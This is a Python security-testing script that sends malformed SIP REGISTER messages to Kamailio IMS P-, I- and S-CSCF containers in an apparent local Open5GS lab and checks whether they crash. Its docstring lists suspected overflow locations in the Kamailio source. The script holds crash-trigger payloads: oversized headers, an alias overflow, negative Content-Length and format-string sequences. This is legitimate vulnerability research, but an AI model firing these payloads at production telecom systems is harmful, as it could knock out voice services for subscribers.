#!/usr/bin/env python3
"""
CSCF Crash Trigger - Complete Test Suite
========================================
Kamailio IMS CSCF v6.1.3 Security Testing

This script combines all crash trigger tests and documents findings.

Environment Restart Command:
    cd /root/5gc/open5gs/docker_open5gs_v3
    docker compose -f sa-vonr-deploy-2.8.1-beta.yaml down
    docker compose -f sa-vonr-deploy-2.8.1-beta.yaml up -d

Source Code Analysis:
    git clone --depth 1 --branch 6.1 https://github.com/kamailio/kamailio.git
    cd kamailio/src/modules/ims_*

==============================================================================
FINDINGS SUMMARY
==============================================================================

1. P-CSCF (ims_registrar_pcscf)
   - save.c:229 - alias parsing potential overflow (portbuf[5], no bounds check)
   - sec_agree.c:166 - while(i <= body.len) potential off-by-one
   - Status: Server handles malformed input gracefully

2. I-CSCF (ims_icscf)
   - registration.c:163 - atoi() without validation
   - Status: No crashes triggered

3. S-CSCF (ims_registrar_scscf, ims_auth)
   - authorize.c:1862 - sprintf with calculated buffer size
   - registrar_notify.c:2778 - buffer overflow check exists
   - Status: No crashes triggered

4. IPSec Module (ims_ipsec_pcscf)
   - ipsec.c:95-104 - string_to_key() potential overflow
   - Buffer: 1024 bytes, key conversion could overflow with large ik/ck
   - Status: ik/ck come from HSS auth vector, not directly attackable via SIP

==============================================================================
"""

import socket
import subprocess
import time
import sys
import argparse
from datetime import datetime

# Configuration
PCSCF_IP = "172.22.0.21"
PCSCF_PORT = 5060
ICSCF_IP = "172.22.0.19"
ICSCF_PORT = 4060
SCSCF_IP = "172.22.0.20"
SCSCF_PORT = 6060
UE_IP = "172.29.0.18"
IMS_DOMAIN = "ims.mnc009.mcc460.3gppnetwork.org"


class CSCTest:
    def __init__(self):
        self.results = []

    def log(self, msg):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    def check_container(self, name):
        result = subprocess.run(
            ['docker', 'inspect', '-f', '{{.State.Running}}', name],
            capture_output=True, text=True
        )
        return result.stdout.strip() == 'true'

    def send_sip(self, msg, target_ip, target_port, timeout=3):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.sendto(msg.encode() if isinstance(msg, str) else msg,
                       (target_ip, target_port))
            try:
                data, _ = sock.recvfrom(65535)
                return data.decode(errors='ignore')
            except socket.timeout:
                return None
            finally:
                sock.close()
        except Exception as e:
            return str(e)

    def record(self, test_name, target, result, crashed=False):
        self.results.append({
            'time': datetime.now().isoformat(),
            'test': test_name,
            'target': target,
            'result': result,
            'crashed': crashed
        })

    # ========================================================================
    # P-CSCF Tests
    # ========================================================================

    def test_pcscf_missing_via(self):
        """Missing Via header - NULL pointer potential"""
        self.log("P-CSCF: Missing Via header")
        msg = (
            f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
            f"From: <sip:13300000001@{IMS_DOMAIN}>;tag=test\r\n"
            f"To: <sip:13300000001@{IMS_DOMAIN}>\r\n"
            f"Call-ID: missing-via@{UE_IP}\r\n"
            f"CSeq: 1 REGISTER\r\n"
            f"Contact: <sip:13300000001@{UE_IP}:5060>;expires=3600\r\n"
            f"Max-Forwards: 70\r\n"
            f"Content-Length: 0\r\n\r\n"
        )
        resp = self.send_sip(msg, PCSCF_IP, PCSCF_PORT)
        crashed = not self.check_container('pcscf')
        self.record("missing_via", "pcscf", resp[:50] if resp else "no response", crashed)
        return crashed

    def test_pcscf_alias_overflow(self):
        """Contact alias overflow - save.c:229"""
        self.log("P-CSCF: Contact alias overflow")
        # portbuf is 5 bytes, no bounds check on memcpy
        msg = (
            f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-alias\r\n"
            f"From: <sip:13300000001@{IMS_DOMAIN}>;tag=test\r\n"
            f"To: <sip:13300000001@{IMS_DOMAIN}>\r\n"
            f"Call-ID: alias-overflow@{UE_IP}\r\n"
            f"CSeq: 1 REGISTER\r\n"
            f"Contact: <sip:13300000001@{UE_IP}:5060;alias=1.2.3.4~{'9' * 100}~1>;expires=3600\r\n"
            f"Max-Forwards: 70\r\n"
            f"Content-Length: 0\r\n\r\n"
        )
        resp = self.send_sip(msg, PCSCF_IP, PCSCF_PORT)
        crashed = not self.check_container('pcscf')
        self.record("alias_overflow", "pcscf", resp[:50] if resp else "no response", crashed)
        return crashed

    def test_pcscf_security_client(self):
        """Malformed Security-Client header"""
        self.log("P-CSCF: Malformed Security-Client")
        test_cases = [
            ("empty", "Security-Client: \r\n"),
            ("no_mechanism", "Security-Client: ;alg=test\r\n"),
            ("oversized", f"Security-Client: ipsec-3gpp; alg={'A' * 5000}\r\n"),
            ("null_bytes", "Security-Client: ipsec-3gpp; alg=\x00\x00\r\n"),
        ]
        for name, hdr in test_cases:
            msg = (
                f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
                f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-sec-{name}\r\n"
                f"From: <sip:13300000001@{IMS_DOMAIN}>;tag=test\r\n"
                f"To: <sip:13300000001@{IMS_DOMAIN}>\r\n"
                f"Call-ID: sec-{name}@{UE_IP}\r\n"
                f"CSeq: 1 REGISTER\r\n"
                f"Contact: <sip:13300000001@{UE_IP}:5060>;expires=3600\r\n"
                f"{hdr}"
                f"Max-Forwards: 70\r\n"
                f"Content-Length: 0\r\n\r\n"
            )
            self.send_sip(msg, PCSCF_IP, PCSCF_PORT)
            if not self.check_container('pcscf'):
                self.record(f"security_client_{name}", "pcscf", "CRASHED", True)
                return True
        self.record("security_client", "pcscf", "no crash", False)
        return False

    # ========================================================================
    # I-CSCF Tests
    # ========================================================================

    def test_icscf_oversized_uri(self):
        """Oversized SIP URI"""
        self.log("I-CSCF: Oversized URI")
        msg = (
            f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-uri\r\n"
            f"From: <sip:{'A' * 5000}@{IMS_DOMAIN}>;tag=test\r\n"
            f"To: <sip:{'A' * 5000}@{IMS_DOMAIN}>\r\n"
            f"Call-ID: oversized-uri@{UE_IP}\r\n"
            f"CSeq: 1 REGISTER\r\n"
            f"Contact: <sip:13300000001@{UE_IP}:5060>;expires=3600\r\n"
            f"Max-Forwards: 70\r\n"
            f"Content-Length: 0\r\n\r\n"
        )
        resp = self.send_sip(msg, ICSCF_IP, ICSCF_PORT)
        crashed = not self.check_container('icscf')
        self.record("oversized_uri", "icscf", resp[:50] if resp else "no response", crashed)
        return crashed

    # ========================================================================
    # S-CSCF Tests
    # ========================================================================

    def test_scscf_auth_overflow(self):
        """Oversized Authorization header"""
        self.log("S-CSCF: Auth header overflow")
        msg = (
            f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-auth\r\n"
            f"From: <sip:13300000001@{IMS_DOMAIN}>;tag=test\r\n"
            f"To: <sip:13300000001@{IMS_DOMAIN}>\r\n"
            f"Call-ID: auth-overflow@{UE_IP}\r\n"
            f"CSeq: 2 REGISTER\r\n"
            f"Contact: <sip:13300000001@{UE_IP}:5060>;expires=3600\r\n"
            f"Authorization: Digest username=\"test\", realm=\"{IMS_DOMAIN}\", "
            f"nonce=\"{'A' * 10000}\", response=\"{'B' * 1000}\"\r\n"
            f"Max-Forwards: 70\r\n"
            f"Content-Length: 0\r\n\r\n"
        )
        resp = self.send_sip(msg, SCSCF_IP, SCSCF_PORT)
        crashed = not self.check_container('scscf')
        self.record("auth_overflow", "scscf", resp[:50] if resp else "no response", crashed)
        return crashed

    # ========================================================================
    # Common Tests
    # ========================================================================

    def test_negative_content_length(self):
        """Negative Content-Length"""
        self.log("Common: Negative Content-Length")
        msg = (
            f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-neg\r\n"
            f"From: <sip:13300000001@{IMS_DOMAIN}>;tag=test\r\n"
            f"To: <sip:13300000001@{IMS_DOMAIN}>\r\n"
            f"Call-ID: neg-cl@{UE_IP}\r\n"
            f"CSeq: 1 REGISTER\r\n"
            f"Contact: <sip:13300000001@{UE_IP}:5060>;expires=3600\r\n"
            f"Max-Forwards: 70\r\n"
            f"Content-Length: -1\r\n\r\n"
        )
        for name, ip, port in [("pcscf", PCSCF_IP, PCSCF_PORT),
                                ("scscf", SCSCF_IP, SCSCF_PORT)]:
            self.send_sip(msg, ip, port)
            if not self.check_container(name):
                self.record("negative_cl", name, "CRASHED", True)
                return True
        self.record("negative_cl", "all", "no crash", False)
        return False

    def test_format_string(self):
        """Format string attack"""
        self.log("Common: Format string")
        msg = (
            f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-%n%n%n%n\r\n"
            f"From: <sip:%s%s%s%s@{IMS_DOMAIN}>;tag=%x%x%x\r\n"
            f"To: <sip:13300000001@{IMS_DOMAIN}>\r\n"
            f"Call-ID: %n%n%n@{UE_IP}\r\n"
            f"CSeq: 1 REGISTER\r\n"
            f"Contact: <sip:13300000001@{UE_IP}:5060>;expires=3600\r\n"
            f"Max-Forwards: 70\r\n"
            f"Content-Length: 0\r\n\r\n"
        )
        for name, ip, port in [("pcscf", PCSCF_IP, PCSCF_PORT),
                                ("icscf", ICSCF_IP, ICSCF_PORT),
                                ("scscf", SCSCF_IP, SCSCF_PORT)]:
            self.send_sip(msg, ip, port)
            if not self.check_container(name):
                self.record("format_string", name, "CRASHED", True)
                return True
        self.record("format_string", "all", "no crash", False)
        return False

    # ========================================================================
    # Main
    # ========================================================================

    def run_all(self):
        print("=" * 70)
        print("CSCF Crash Trigger - Complete Test Suite")
        print("=" * 70)
        print(f"Start time: {datetime.now()}")
        print()

        tests = [
            ("P-CSCF Missing Via", self.test_pcscf_missing_via),
            ("P-CSCF Alias Overflow", self.test_pcscf_alias_overflow),
            ("P-CSCF Security-Client", self.test_pcscf_security_client),
            ("I-CSCF Oversized URI", self.test_icscf_oversized_uri),
            ("S-CSCF Auth Overflow", self.test_scscf_auth_overflow),
            ("Negative Content-Length", self.test_negative_content_length),
            ("Format String", self.test_format_string),
        ]

        crashed = []
        for name, func in tests:
            try:
                if func():
                    crashed.append(name)
                    print(f"  *** CRASH: {name} ***")
            except Exception as e:
                self.log(f"Error in {name}: {e}")
            time.sleep(1)

        print()
        print("=" * 70)
        print("RESULTS")
        print("=" * 70)

        if crashed:
            print(f"\nCrashes triggered: {len(crashed)}")
            for c in crashed:
                print(f"  - {c}")
        else:
            print("\nNo crashes detected.")
            print("\nAnalysis:")
            print("  - Kamailio 6.1.3 handles malformed SIP gracefully")
            print("  - Most parsing errors return 400/500 without crashing")
            print("  - IPSec vulnerabilities require authenticated session")
            print("  - Consider fuzzing Diameter/Cx interface for deeper testing")

        print(f"\nEnd time: {datetime.now()}")
        return crashed


def main():
    parser = argparse.ArgumentParser(description='CSCF Crash Trigger Suite')
    parser.add_argument('--restart', action='store_true',
                       help='Restart environment before testing')
    args = parser.parse_args()

    if args.restart:
        print("Restarting environment...")
        subprocess.run([
            'docker', 'compose', '-f',
            '/root/5gc/open5gs/docker_open5gs_v3/sa-vonr-deploy-2.8.1-beta.yaml',
            'down'
        ], capture_output=True)
        time.sleep(5)
        subprocess.run([
            'docker', 'compose', '-f',
            '/root/5gc/open5gs/docker_open5gs_v3/sa-vonr-deploy-2.8.1-beta.yaml',
            'up', '-d'
        ], capture_output=True)
        print("Waiting for services to start...")
        time.sleep(30)

    tester = CSCTest()
    tester.run_all()


if __name__ == '__main__':
    main()
